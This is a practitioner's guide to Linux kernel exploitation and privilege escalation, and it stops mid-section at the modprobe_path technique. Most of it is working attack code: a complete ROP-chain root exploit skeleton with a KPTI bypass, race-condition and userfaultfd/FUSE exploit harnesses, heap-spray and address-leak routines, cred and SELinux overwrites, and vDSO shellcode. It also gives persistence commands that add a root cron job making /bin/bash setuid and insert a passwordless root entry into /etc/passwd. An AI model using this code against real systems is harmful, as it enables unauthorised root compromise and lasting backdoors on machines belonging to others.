# Advanced Linux Kernel Exploitation & Privilege Escalation

A practitioner's reference for modern kernel exploit development, covering ROP chains, privilege escalation primitives, concurrency bug exploitation, eBPF attacks, and walkthroughs of landmark CVEs.

---

## Table of Contents

1. [Kernel ROP & Code Execution](#1-kernel-rop--code-execution)
2. [Privilege Escalation Techniques](#2-privilege-escalation-techniques)
3. [Exploiting Kernel Concurrency Bugs](#3-exploiting-kernel-concurrency-bugs)
4. [Advanced Kernel Exploitation Primitives](#4-advanced-kernel-exploitation-primitives)
5. [eBPF Exploitation](#5-ebpf-exploitation)
6. [Notable Kernel Exploits Walkthrough](#6-notable-kernel-exploits-walkthrough)

---

## 1. Kernel ROP & Code Execution

### 1.1 Finding ROP Gadgets in the Kernel

The kernel image `vmlinux` (with symbols) is the primary source for ROP gadgets. Extract it from the compressed `vmlinux.gz` or use `/boot/vmlinux` directly if available.

**Extracting vmlinux from a compressed kernel image:**

```bash
# Method 1: extract-vmlinux script
cat /boot/vmlinuz-$(uname -r) | \
  python3 -c "
import sys, zlib
data = sys.stdin.buffer.read()
# Try different offsets for gzip header
for i in range(len(data)):
    if data[i:i+2] == b'\\x1f\\x8b':
        try:
            sys.stdout.buffer.write(zlib.decompress(data[i:], zlib.MAX_WBITS|16))
            break
        except: continue
" > vmlinux

# Method 2: Using extract-vmlinux from kernel tree
./scripts/extract-vmlinux /boot/vmlinuz-$(uname -r) > vmlinux
```

**Finding gadgets with ROPgadget:**

```bash
pip3 install ROPgadget

# General gadget search
ROPgadget --binary ./vmlinux | less

# Specific gadgets for kernel exploitation
ROPgadget --binary ./vmlinux --re "pop rdi ; ret"
ROPgadget --binary ./vmlinux --re "pop rcx ; ret"
ROPgadget --binary ./vmlinux --re "mov rdi, rax ; .* ret"
ROPgadget --binary ./vmlinux --re "swapgs ; .* iretq"
ROPgadget --binary ./vmlinux --re "push ; pop ; ret"  # stack pivots
```

**Finding gadgets with ropper:**

```bash
pip3 install ropper

ropper --file ./vmlinux --search "pop rdi"
ropper --file ./vmlinux --search "iretq"
ropper --file ./vmlinux --search "swapgs"
ropper --file ./vmlinux --chain "execve"  # auto-chain builder (limited for kernel)
```

**Critical gadgets needed for kernel ROP:**

| Gadget | Purpose |
|--------|---------|
| `pop rdi; ret` | Set first argument (for `prepare_kernel_cred`, `commit_creds`) |
| `pop rcx; ret` | Set second argument if needed |
| `mov rdi, rax; ... ret` | Chain return value of `prepare_kernel_cred` into `commit_creds` |
| `swapgs; ... iretq` | Return to userland |
| `xchg eax, esp; ret` | Stack pivot candidate |

### 1.2 Building Kernel ROP Chains

The canonical kernel ROP chain calls `commit_creds(prepare_kernel_cred(0))` to elevate privileges, then returns to userland.

**Full exploit skeleton — ROP chain with KPTI bypass:**

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>

// Offsets discovered for the target kernel (change per build)
// Use: /proc/kallsyms or grep vmlinux System.map
#define PREPARE_KERNEL_CRED 0xffffffff810a9b40ULL
#define COMMIT_CREDS        0xffffffff810a9840ULL
#define POP_RDI_RET         0xffffffff8100123eULL
#define POP_RCX_RET         0xffffffff8101b589ULL
#define MOV_RDI_RAX_RET    0xffffffff8109a7cbULL  // mov rdi, rax; pop rbx; ret
#define SWAPGS_IRETQ        0xffffffff81a00c7aULL  // swapgs; iretq
#define KPTI_TRAMPOLINE     0xffffffff81a008e0ULL  // entry_SYSCALL_64 + offset

// Userland shell
void shell() {
    printf("[*] Got root!\n");
    system("id");
    system("/bin/sh");
}

// Saved state for iretq
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushf\n"
        "pop %2\n"
        "mov %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
    );
}

// Trigger function — replace with actual vulnerability trigger
void trigger_vuln(unsigned long *rop_chain, size_t chain_len) {
    int fd = open("/dev/vuln_device", O_RDWR);
    if (fd < 0) { perror("open"); exit(1); }
    // The specific write/read/ioctl that causes stack buffer overflow
    // or other controlled overwrite of the return address
    write(fd, rop_chain, chain_len * sizeof(unsigned long));
    close(fd);
}

int main() {
    save_state();

    // Build ROP chain on the stack via overflow
    // The chain starts after the padding + saved RIP overwrite
    unsigned long rop_chain[256];
    int i = 0;

    // Padding — fill until we reach the saved return address
    // This depends on the specific vulnerability buffer size
    for (int j = 0; j < 32; j++) {
        rop_chain[i++] = 0x4141414141414141ULL;  // padding
    }

    // ROP chain: commit_creds(prepare_kernel_cred(0))
    rop_chain[i++] = POP_RDI_RET;          // pop rdi; ret
    rop_chain[i++] = 0;                     // rdi = 0 (for prepare_kernel_cred(0))
    rop_chain[i++] = PREPARE_KERNEL_CRED;   // call prepare_kernel_cred(0)
    // rax now holds the new cred pointer
    rop_chain[i++] = MOV_RDI_RAX_RET;       // mov rdi, rax; pop rbx; ret
    rop_chain[i++] = 0;                     // junk for pop rbx
    rop_chain[i++] = COMMIT_CREDS;          // call commit_creds(new_cred)

    // Return to userland — KPTI trampoline method (preferred)
    // The KPTI trampoline handles swapgs and iretq + restores the user page tables
    rop_chain[i++] = KPTI_TRAMPOLINE;
    // After trampoline, we push our saved state for iretq
    rop_chain[i++] = 0;                     // rax (junk)
    rop_chain[i++] = 0;                     // rdi (junk)
    // The trampoline does: swapgs; iretq with these values on stack
    rop_chain[i++] = (unsigned long)shell;  // rip
    rop_chain[i++] = user_cs;               // cs
    rop_chain[i++] = user_rflags;           // rflags
    rop_chain[i++] = user_sp;               // rsp
    rop_chain[i++] = user_ss;               // ss

    trigger_vuln(rop_chain, i);
    return 0;
}
```

**Alternative: manual swapgs + iretq return (when KPTI trampoline offset unknown):**

```c
    // After commit_creds:
    rop_chain[i++] = SWAPGS_IRETQ;        // swapgs; ... iretq
    rop_chain[i++] = (unsigned long)shell;  // rip
    rop_chain[i++] = user_cs;               // cs
    rop_chain[i++] = user_rflags;           // rflags
    rop_chain[i++] = user_sp;               // rsp
    rop_chain[i++] = user_ss;               // ss
```

> **Warning**: Without KPTI trampoline, on KPTI-enabled kernels, returning to userland directly via `swapgs; iretq` will cause a page fault because the kernel page tables don't map user pages and the user page tables don't include kernel mappings. The KPTI trampoline switches CR3 first.

### 1.3 KROP (Kernel ROP) with Constrained Gadget Sets

When `mov rdi, rax; ret` is unavailable, alternative strategies exist:

**Strategy 1: Using `push rax; ... pop rdi; ret` sequences:**

```bash
# Search for a combined sequence
ROPgadget --binary ./vmlinux --re "push rax.*pop rdi.*ret"
```

**Strategy 2: Using `xchg rdi, rax; ret` or similar:**

```
# Chain:
pop rdi; ret        -> 0 (arg to prepare_kernel_cred)
prepare_kernel_cred -> result in rax
xchg rdi, rax; ret  -> rdi = rax (new cred), rax = old rdi
commit_creds        -> commit_creds(new_cred)
```

**Strategy 3: Using the `cmp rax` side-effect trick (rare):**

Some gadgets set rdi from memory controlled by the attacker:
```
pop rax; ret               -> address of controlled memory
mov rdi, [rax]; ret        -> load rdi from that memory
```

**Strategy 4: Two-function call using a callee-saved register:**

If `commit_creds` only touches rdi and rax, we can use a gadget that moves the result to a register that `commit_creds` won't clobber:

```
pop rdi; ret               -> 0
prepare_kernel_cred
mov rbx, rax; ret          # or any preserved register
pop rdi; ret               -> rbx address? No — need:
mov rdi, rbx; ret          -> rdi = new cred
commit_creds
```

**Strategy 5: Defaulting to `msleep` or similar for testing:**

When full LPE chains fail, calling a known-safe kernel function proves RIP control:
```c
#define MSLEEP 0xffffffff810xxxxxULL
rop_chain[i++] = POP_RDI_RET;
rop_chain[i++] = 1000;   // sleep 1 second
rop_chain[i++] = MSLEEP;
```

### 1.4 Returning to Userland: The Full Picture

The x86_64 kernel return path requires:

1. **`swapgs`** — swaps the GS base between kernel and user GS base
2. **`iretq`** — pops RIP, CS, RFLAGS, RSP, SS from the stack
3. **CR3 switch** — on KPTI kernels, switch page tables back to user

**The KPTI trampoline (preferred approach):**

Located in `entry_SYSCALL_64_compat` or the KPTI return path. The exact offset varies per kernel build. Search for it:

```bash
# In vmlinux disassembly, look for the pattern near swapgs_restore_regs_and_return_to_usermode
objdump -d ./vmlinux | grep -A 30 "swapgs_restore_regs_and_return_to_usermode"
# Or:
ROPgadget --binary ./vmlinux | grep "swapgs" | grep "iretq"
```

The KPTI trampoline at the correct offset expects the stack to contain:
```
[RIP]      <- userland RIP
[CS]       <- userland CS
[RFLAGS]   <- userland RFLAGS
[RSP]      <- userland RSP
[SS]       <- userland SS
```

But the trampoline *entry* point first pops `rdi` and `rsi`, so we need 2 dummy values before the `iretq` frame:
```
[0]        <- rax (popped by trampoline)
[0]        <- rdi (popped by trampoline)  
[shell]    <- rip (for iretq)
[user_cs]  <- cs
[user_rflags] <- rflags
[user_sp]  <- rsp
[user_ss]  <- ss
```

**Verifying your return path works** — common crash causes:

| Symptom | Cause |
|---------|-------|
| Page fault at `0xffffffff...` | KPTI not handled; CR3 still has kernel PGD |
| GPF at return | Missing `swapgs` or wrong CS/SS values |
| Crash in `copy_cred` | Corrupted cred structure |
| Infinite loop | Wrong iretq frame alignment |

### 1.5 ModRM / RBP-based Kernel Exploitation

When stack control is limited but RBP is controlled, use stack pivoting via `leave; ret`:

```
leave = mov rsp, rbp; pop rbp
ret   = pop rip
```

If attacker controls `rbp`, then `leave; ret` will set `rsp = <controlled_rbp> + 8` and return to an address at that location.

**Setting up a fake stack in user memory (SMEP must be bypassed first or mapped as executable):**

```c
// Map a page for our fake stack
unsigned long *fake_stack = mmap(
    (void *)0x7fff0000, 0x1000,
    PROT_READ | PROT_WRITE,
    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0
);

// Fill fake stack with ROP chain
int j = 0;
fake_stack[j++] = 0;  // pop rbp filler from 'leave'
fake_stack[j++] = POP_RDI_RET;
fake_stack[j++] = 0;
fake_stack[j++] = PREPARE_KERNEL_CRED;
// ... etc
```

### 1.6 Sigreturn-Based Kernel Exploitation

The `sigreturn` system call restores all registers from a `sigframe` structure on the stack, including RIP, CS, RFLAGS, RSP, SS. This is a powerful "one gadget" for setting up iretq-like return state.

**Exploitation pattern:**

1. Find `sigreturn` syscall entry (`__x86_sigreturn` or use `syscall` gadget)
2. Craft a fake `sigframe` structure with desired register values
3. Trigger the vulnerability to redirect execution to `sigreturn`
4. All registers are restored atomically

```c
#include <signal.h>

// The ucontext_t / sigframe layout on x86_64
struct sigframe_64 {
    char __pretcode[8];
    unsigned long retcode;
    struct {
        unsigned long sc_handler;
        unsigned long sc_flags;
        unsigned long sc_cs;
        unsigned long sc_ds;
        unsigned long sc_es;
        unsigned long sc_fs;
        unsigned long sc_gs;
        unsigned long sc_ss;
        unsigned long sc_err;
        unsigned long sc_trapno;
        unsigned long sc_rip;
        unsigned long sc_cs_actual;
        unsigned long sc_rflags;
        unsigned long sc_rsp;
        unsigned long sc_ss_actual;
        // ... rax, rdi, etc.
    } sc;
};

// Use sys_sigreturn to restore state:
// Must be at kernel privilege when called
#define SYS_RT_SIGRETURN 15

void build_sigreturn_chain(unsigned long *chain) {
    int i = 0;
    chain[i++] = SYS_RT_SIGRETURN;   // rax = __NR_rt_sigreturn
    chain[i++] = SYSCALL_GADGET;      // syscall; ret
    // The sigframe will be at the stack pointer when sigreturn executes
    // Point rsp to a user-mapped area with the fake sigframe
    // ... (set up at known address)
}
```

> **Note**: Modern kernels with `SA_RESTORER` validation increasingly block this technique. However, on older kernels or with specific `sigreturn` gadgets in the kernel text itself (not via `syscall`), it remains viable.

---

## 2. Privilege Escalation Techniques

### 2.1 Overwriting task_struct->cred

The `task_struct` is the kernel's per-process descriptor. The `cred` pointer (`task_struct->cred`) points to the process's credential structure.

**Direct overwrite of `cred` pointer:**

If you have an arbitrary write primitive, overwrite `current->cred` to point to `init_cred` (the root credential structure):

```c
// Find init_cred and current task_struct addresses
// From /proc/kallsyms or System.map:
#define INIT_CRED  0xffffffff82658a80ULL  // &init_cred
#define CURRENT_TASK 0xffffffff82a0c400ULL // current task_struct (or find dynamically)

// Overwrite current->cred = &init_cred
// Step 1: Find current task_struct pointer
// On modern kernels, use 'current_task' per-CPU variable:
//   cat /proc/kallsyms | grep current_task
// Or: read from task_struct list

// Step 2: Write the cred pointer
// write_value(CURRENT_TASK + OFFSET_CRED, INIT_CRED)
// where OFFSET_CRED is the offset of ->cred within task_struct
// Typical offset: check with pahole or grep vmlinux
```

**Finding the `cred` offset in `task_struct`:**

```bash
# From the kernel debug info or vmlinux with DWARF:
pahole -C task_struct vmlinux | grep cred
# Or:
grep -a "cred" /boot/System.map-$(uname -r)
# Or use /proc/kallsyms for specific kernel builds
```

**Indirect overwrite — modifying credential fields directly:**

If you can write to the `cred` structure itself (rather than the pointer), zero out the uid/gid fields:

```c
// Typical struct cred layout (x86_64):
// offset 0x04: uid
// offset 0x08: gid
// offset 0x0c: euid
// offset 0x10: egid
// All should be set to 0 for root

// Arbitrary write: set current->cred->uid = 0
// First, read current->cred to get the address
// Then write 0 at (cred_addr + offsetof_uid)
void escalate_via_cred_write(arb_write_fn write_fn) {
    // Leak current->cred address (need arbitrary read too)
    unsigned long task_addr = read_task_addr();
    unsigned long cred_addr = read64(task_addr + CRED_OFFSET);

    // Zero out uid, gid, euid, egid
    write_fn(cred_addr + 4,  0);  // uid  = 0
    write_fn(cred_addr + 8,  0);  // gid  = 0
    write_fn(cred_addr + 12, 0);  // euid = 0
    write_fn(cred_addr + 16, 0);  // egid = 0
}
```

### 2.2 The commit_creds(prepare_kernel_cred(0)) Pattern

The most common and reliable privilege escalation pattern. When executing arbitrary kernel code (e.g., via ROP or function pointer overwrite):

```c
// kernel function signatures:
// struct cred *prepare_kernel_cred(struct task_struct *daemon);
//   - If daemon == NULL, creates a new cred with full root privileges
// int commit_creds(struct cred *new);
//   - Sets current task's credentials to new

// In a kernel exploit:
void escalate(void) {
    // In kernel context (from ROP chain, UAF function pointer, etc.)
    commit_creds(prepare_kernel_cred(0));
}
```

**Finding the addresses:**

```bash
# Method 1: /proc/kallsyms (requires root or kptr_restrict=0)
sudo cat /proc/kallsyms | grep -E "prepare_kernel_cred|commit_creds"

# Method 2: System.map
grep -E "prepare_kernel_cred|commit_creds" /boot/System.map-$(uname -r)

# Method 3: From vmlinux with symbols
nm vmlinux | grep -E "prepare_kernel_cred|commit_creds"

# If kptr_restrict is set, bypass with unprivileged reads:
# - Information leak via dmesg (if dmesg_restrict=0)
# - Side channels (cache timing, branch prediction)
# - Info leak in vulnerable kernel module
```

### 2.3 Bypassing Cred-Based Protections

**Protection: `_cred` guard pages / canary:**

Some hardened kernels place guard values around the cred structure. Bypass by writing the entire cred to a known-good state, not individual fields.

**Protection: ` cred` reference counting:**

The kernel uses reference counting on cred structures. If the count doesn't match, it may trigger warnings. Overwrite the `usage` count field as well:

```c
// After creating a new cred, fix up the usage count
// or overwrite the existing cred in-place to avoid refcount issues
```

**Protection: SELinux / AppArmor:**

Even with uid=0, MAC policies may restrict actions:

```c
// Overwrite current->cred->security to point to init_cred's security label
// Or: disable SELinux by writing to selinux_enabled / selinux_enforcing
#define SELINUX_ENFORCING 0xffffffff826xxxxxULL
arb_write(SELINUX_ENFORCING, 0);  // set to permissive
```

### 2.4 File-Based Persistence (When Direct LPE Is Harder)

When kernel code execution isn't reliable but partial write primitives exist:

```c
// Write to /etc/cron.d for persistence
// Requires: arbitrary write that can reach a file write path
// Commonly: misuse of symlink/hardlink in writable paths

// From kernel context:
// 1. Open /etc/cron.d/rootexp using kernel file I/O
// 2. Write: "* * * * * root /bin/bash -c 'chmod u+s /bin/bash'"
// Alternative: overwrite /etc/passwd entry

// From userland (if you have partial root):
system("echo '* * * * * root /bin/bash -c \"chmod u+s /bin/bash\"' > /etc/cron.d/rootexp");
system("echo 'root::0:0:root:/root:/bin/sh' >> /etc/passwd");  // empty password
```

### 2.5 Namespace and Capability Manipulation

**Escaping namespaces from kernel context:**

```c
// In kernel context, we can modify current->nsproxy to point to init_nsproxy
// Or switch to the init namespace:
#define INIT_NSPROXY 0xffffffff826xxxxxULL

// Overwrite current->nsproxy
arb_write(current_task + NSPROXY_OFFSET, INIT_NSPROXY);

// Capability manipulation:
// Set all capability bits in the cred
void set_full_caps(struct cred *cred) {
    // cap_effective, cap_inheritable, cap_permitted
    // Each is kernel_cap_t (2 x u32 or u64 depending on kernel version)
    memset(&cred->cap_effective, 0xff, sizeof(kernel_cap_t));
    memset(&cred->cap_inheritable, 0xff, sizeof(kernel_cap_t));
    memset(&cred->cap_permitted, 0xff, sizeof(kernel_cap_t));
    // Also set cap_bset (bounding set)
    memset(&cred->cap_bset, 0xff, sizeof(kernel_cap_t));
}
```

**User namespace escalation from unprivileged:**

```c
// Since kernel 3.8+, unprivileged users can create user namespaces
// This gives CAP_SYS_ADMIN within the namespace
// Combined with mount namespaces, this allows:

// 1. Create user namespace (get CAP_SYS_ADMIN in it)
// 2. Create mount namespace
// 3. Mount overlayfs (for OverlayFS exploits)
// 4. Manipulate file systems with elevated permissions

unshare(CLONE_NEWUSER | CLONE_NEWNS);
// Now we have capabilities within our namespace
```

---

## 3. Exploiting Kernel Concurrency Bugs

### 3.1 Race Conditions in Kernel Code

Kernel race conditions occur when two or more execution contexts (threads, interrupt handlers, softirqs) access shared data without proper synchronization.

**Typical TOCTOU (Time-of-Check-to-Time-of-Use) in syscall:**

```c
// Vulnerable kernel code pattern:
static long vulnerable_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    struct user_data __user *uarg = (struct user_data __user *)arg;
    struct kernel_data kdata;

    // CHECK: validate user data
    if (copy_from_user(&kdata, uarg, sizeof(kdata)))
        return -EFAULT;
    if (kdata.size > MAX_SIZE)
        return -EINVAL;

    // USE: allocate based on validated size — but user can change size between check and use
    buf = kmalloc(kdata.size, GFP_KERNEL);  // kdata.size could have been
                                              // changed by another thread
    // ...
}
```

**Exploiting with threads to widen the race window:**

```c
#define _GNU_SOURCE
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>

#define NUM_THREADS 8

static volatile int stop_race;

// Thread that keeps modifying the shared data
void *race_thread(void *arg) {
    struct user_data *udata = (struct user_data *)arg;
    while (!stop_race) {
        // Toggle between small (passes check) and large (causes overflow)
        udata->size = 16;
        sched_yield();
        udata->size = 0x10000;
        sched_yield();
    }
    return NULL;
}

// Thread that invokes the vulnerable syscall
void *ioctl_thread(void *arg) {
    int fd = open("/dev/vuln", O_RDWR);
    while (!stop_race) {
        ioctl(fd, VULN_CMD, (unsigned long)arg);
    }
    close(fd);
    return NULL;
}

int main() {
    struct user_data *udata = mmap(NULL, 0x1000,
        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    udata->size = 16;

    pthread_t racers[NUM_THREADS], ioctls[NUM_THREADS];
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_create(&racers[i], NULL, race_thread, udata);
        pthread_create(&ioctls[i], NULL, ioctl_thread, udata);
    }

    sleep(10);
    stop_race = 1;

    // Check if we won the race
    system("id");
    return 0;
}
```

### 3.2 Exploiting Use-Before-Free in RCU Read-Side Critical Sections

RCU (Read-Copy-Update) allows lock-free reads. A use-before-free occurs when a reader accesses an object after it has been scheduled for deletion but before the RCU grace period completes.

**Exploitation strategy:**

1. Allocate target object in shared RCU-protected list
2. Trigger removal (object is marked for deletion but not yet freed)
3. Reclaim the object's memory with a crafted object (heap spray)
4. The reader still holds a stale pointer and uses the sprayed data

```c
// Heap spray to reclaim freed RCU object
// Target: reclaim with a different object type that has controlled fields
void spray_rcu_object(int fd) {
    // Spray with a controllable object (e.g., msg_msg, setxattr buffer, sendmsg)
    // msg_msg technique:
    struct {
        long mtype;
        char mtext[0x400 - sizeof(long)];
    } msg;

    msg.mtype = 1;
    memset(msg.mtext, 'A', sizeof(msg.mtext));

    // Create many message queues and send messages to fill the freed slot
    for (int i = 0; i < SPRAY_COUNT; i++) {
        msgsnd(msgq_ids[i], &msg, sizeof(msg.mtext), 0);
    }
}
```

### 3.3 Double-Fetch Vulnerabilities

A double-fetch occurs when the kernel reads user data twice — the attacker can change the data between reads:

```c
// Vulnerable kernel pattern:
ssize_t vuln_write(struct file *file, const char __user *buf, size_t count) {
    struct header hdr;

    // First fetch: get header
    if (copy_from_user(&hdr, buf, sizeof(hdr)))
        return -EFAULT;
    if (hdr.len > MAX_LEN)
        return -EINVAL;

    // Second fetch: re-read header (or re-reference user pointer)
    // BUG: attacker can change hdr.len between first and second fetch
    if (copy_from_user(&process_buf, buf + hdr.offset, hdr.len))
        // hdr.len might be different from what was validated!
```

**Exploiting double-fetch with userfaultfd:**

```c
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>

// Set up a page that will fault on second access
// Page 1: contains valid header (small size)
// Page 2: fault handler delays, then changes header to large size

static int uffd_fd;

void *fault_handler_thread(void *arg) {
    struct uffd_msg msg;
    struct uffdio_copy copy;
    unsigned long fault_addr;

    for (;;) {
        read(uffd_fd, &msg, sizeof(msg));
        if (msg.event != UFFD_EVENT_PAGEFAULT)
            continue;

        fault_addr = msg.arg.pagefault.address;

        // First access: provide valid data
        // Delay until kernel has passed the check
        usleep(1000);  // Widen race window

        // Second access: provide malicious data
        struct header *hdr = (struct header *)fault_addr;
        hdr->len = 0x10000;  // Oversized
        hdr->offset = 0;

        // Resolve the fault
        copy.dst = fault_addr & ~0xFFF;
        copy.src = (unsigned long)page_data;
        copy.len = 0x1000;
        copy.mode = 0;
        ioctl(uffd_fd, UFFDIO_COPY, &copy);
    }
}
```

### 3.4 Memory Ordering Issues

The kernel uses memory barriers (`smp_mb()`, `smp_rmb()`, `smp_wmb()`) to enforce ordering. Missing or incorrect barriers can cause exploitation-grade bugs.

```c
// Vulnerable pattern: missing smp_wmb() between write and flag set
data->valid = 1;       // Should come AFTER data is written
data->count = count;    // But compiler/CPU may reorder
smp_wmb();             // Missing: allows reader to see valid=1 with stale count

// Exploitation: reader sees valid=1 and trusts count, but count is old/garbage
```

**Detecting missing barriers:**

On x86, most loads/stores are ordered due to TSO, but on ARM/PowerPC, weak ordering makes these bugs exploitable. Always test on weakly-ordered architectures.

### 3.5 userfaultfd for Heap Shaping

`userfaultfd` allows user programs to handle page faults in user memory. This is extremely powerful for kernel exploitation because it lets an attacker **pause** the kernel in the middle of a syscall while it accesses user memory.

**Complete userfaultfd setup for exploitation:**

```c
#define _GNU_SOURCE
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <signal.h>

static int uffd;
static pthread_t fault_thread;

void setup_userfaultfd(void *area, size_t size) {
    struct uffdio_api api = { .api = UFFD_API };
    struct uffdio_register reg;

    // Create userfaultfd
    uffd = syscall(SYS_userfaultfd, O_NONBLOCK);
    if (uffd < 0) { perror("userfaultfd"); exit(1); }

    ioctl(uffd, UFFDIO_API, &api);

    // Register memory region for fault handling
    reg.mode = UFFDIO_REGISTER_MODE_MISSING;
    reg.range.start = (unsigned long)area;
    reg.range.len = size;
    ioctl(uffd, UFFDIO_REGISTER, &reg);
}

void *fault_handler(void *arg) {
    struct uffd_msg msg;
    struct uffdio_copy copy;
    unsigned char page[0x1000];

    while (1) {
        // Wait for fault
        read(uffd, &msg, sizeof(msg));

        if (msg.event == UFFD_EVENT_PAGEFAULT) {
            unsigned long addr = msg.arg.pagefault.address & ~0xFFF;

            // AT THIS POINT: the kernel is blocked waiting for this page
            // We can do heap operations while the kernel is paused!
            //
            // For example:
            //   1. Free the object that the kernel will process
            //   2. Reclaim with a different object (heap spray)
            //   3. Then resolve the fault

            // Do exploitation here...
            do_exploit_work();

            // Resolve the fault with our data
            memset(page, 0, sizeof(page));
            // Fill page with attacker-controlled data
            *(unsigned long *)page = 0xdeadbeef;

            copy.dst = addr;
            copy.src = (unsigned long)page;
            copy.len = 0x1000;
            copy.mode = 0;
            ioctl(uffd, UFFDIO_COPY, &copy);
        }
    }
}

int main() {
    // Map two pages: first page is faulting, second is present
    void *area = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    setup_userfaultfd(area, 0x1000);  // First page only

    pthread_create(&fault_thread, NULL, fault_handler, NULL);

    // Trigger the vulnerability — kernel will fault on first page
    // and call our fault handler, where we do exploitation
    trigger_vuln(area);

    return 0;
}
```

> **Note**: Since Linux 5.11, `userfaultfd` requires `CAP_SYS_PTRACE` on unreachable UFFDs for unprivileged users. Many exploits were mitigated. However, FUSE remains as an alternative.

### 3.6 FUSE for Blocking Kernel Execution

FUSE (Filesystem in Userspace) provides a similar capability to `userfaultfd` — it allows blocking the kernel while it processes a file operation, because the kernel waits for the userspace FUSE daemon to respond.

```c
#define FUSE_USE_VERSION 31
#include <fuse3/fuse.h>
#include <pthread.h>

static volatile int exploit_done;

// FUSE operations handler
static int fuse_read(const char *path, char *buf, size_t size,
                     off_t offset, struct fuse_file_info *fi) {
    // The kernel is NOW blocked waiting for this read to return!
    // Do exploitation work here (heap spray, free objects, etc.)

    printf("[*] Kernel blocked in FUSE read — exploiting...\n");
    do_exploit_work();
    exploit_done = 1;

    // Return data to unblock the kernel
    memset(buf, 0x41, size);
    return size;
}

static struct fuse_operations ops = {
    .read = fuse_read,
};

void *fuse_thread(void *arg) {
    char *argv[] = { "exploit", "/tmp/fuse_mount", "-f", NULL };
    fuse_main(3, argv, &ops, NULL);
    return NULL;
}

int main() {
    mkdir("/tmp/fuse_mount", 0777);
    pthread_t tid;
    pthread_create(&tid, NULL, fuse_thread, NULL);
    sleep(1);  // Wait for FUSE to be ready

    // Trigger vulnerable syscall that reads from FUSE file
    int fd = open("/tmp/fuse_mount/controlled", O_RDWR);
    // This read will block in kernel, calling our fuse_read handler
    read(fd, buf, sizeof(buf));

    // Meanwhile, our exploit has run
    system("id");
    return 0;
}
```

### 3.7 IPC VDSO Exploitation

The vDSO (Virtual Dynamic Shared Object) is a shared library mapped into every process by the kernel. It contains fast-path system call implementations.

**Exploitation concept:**

1. Corrupt the vDSO page in kernel memory (requires kernel write primitive)
2. Inject shellcode into vDSO that executes with kernel privileges
3. When any process calls a vDSO function, it runs the shellcode

```c
// The vDSO is mapped from a kernel page. Its address can be found:
//   cat /proc/kallsyms | grep vdso
// Or from userland:
//   vsyscall page at 0xffffffffff600000 (legacy)
//   vdso_base from /proc/self/maps

// Overwrite vDSO clock_gettime with shellcode:
void exploit_vdso(unsigned long vdso_addr, arb_write_fn write_fn) {
    // Typical: overwrite clock_gettime() in vdso
    // The shellcode calls commit_creds(prepare_kernel_cred(0))
    // then returns to the original function

    // Shellcode:
    unsigned char shellcode[] = {
        // push rax; push rbx; push rcx; push rdx
        0x50, 0x53, 0x51, 0x52,
        // xor rdi, rdi
        0x48, 0x31, 0xff,
        // call prepare_kernel_cred (relative or absolute)
        // mov rdi, rax
        0x48, 0x89, 0xc7,
        // call commit_creds
        // pop rdx; pop rcx; pop rbx; pop rax
        0x5a, 0x59, 0x5b, 0x58,
        // jmp original_code
    };

    write_fn(vdso_addr + VDSO_CLOCK_GETTIME_OFFSET, shellcode);
}
```

---

## 4. Advanced Kernel Exploitation Primitives

### 4.1 Arbitrary Read Primitives

An arbitrary kernel read primitive lets you leak kernel addresses, bypass KASLR, and find target structures.

**Common sources of arbitrary read:**

| Source | Technique |
|--------|-----------|
| `copy_to_user` with controlled source | Direct kernel memory leak |
| Out-of-bounds read on kmalloc'd buffer | Read adjacent heap objects |
| `seq_operations->show` function pointer | Read via `seq_file` operations |
| `/proc/kallsyms` (if `kptr_restrict=0`) | Full symbol leak |
| `dmesg` (if `dmesg_restrict=0`) | Partial address leaks |
| Uninitialized stack variables | Leak via `copy_to_user` of struct padding |

**Implementing arbitrary read via OOB read:**

```c
// If a vulnerable module has an out-of-bounds read:
// read(fd, buf, SIZE) where SIZE > allocated_buffer

void leak_kernel_addresses(int fd) {
    char buf[0x1000];
    memset(buf, 0, sizeof(buf));

    // Read beyond the buffer to get adjacent heap data
    ssize_t n = read(fd, buf, sizeof(buf));

    // Parse leaked data for kernel pointers
    unsigned long *leaked = (unsigned long *)buf;
    for (int i = 0; i < n / 8; i++) {
        unsigned long val = leaked[i];
        if (val >= 0xffffffff80000000ULL && val <= 0xfffffffffffff000ULL) {
            printf("[+] Leaked kernel pointer: 0x%lx at offset %d\n", val, i);
        }
    }
}
```

**Leaking KASLR base via `msg_msg`:**

```c
#include <sys/msg.h>

// msg_msg objects have a linked list pointer (m_list.next/prev)
// that points to the msg_queue in kernel memory.
// By reading past the message data, we can leak kernel addresses.

struct {
    long mtype;
    char mtext[0x400];
} msg;

void leak_via_msgmsg(int qid) {
    msg.mtype = 1;
    memset(msg.mtext, 'A', sizeof(msg.mtext));
    msgsnd(qid, &msg, sizeof(msg.mtext), 0);

    // If we can read OOB past msg.mtext, we get m_list pointers
    // which point back to the msg_queue structure
    msgrcv(qid, &msg, sizeof(msg.mtext) + 0x20, 0, IPC_NOWAIT | MSG_COPY);
    // The extra 0x20 bytes beyond mtext will contain m_list pointers
}
```

### 4.2 Arbitrary Write Primitives

**Common sources of arbitrary write:**

| Source | Technique |
|--------|-----------|
| `copy_from_user` with controlled dest | Direct kernel memory write |
| Use-after-free with function pointer | Overwrite object with fake vtable |
| `msg_msg->next` overwrite | Linked list manipulation → arbitrary write |
| `modprobe_path` overwrite | Redirect modprobe execution |
| `cred` overwrite | Privilege escalation |
| `pty buffer` UAF write | Write to freed tty buffer |

**The modprobe_path technique:**

```c
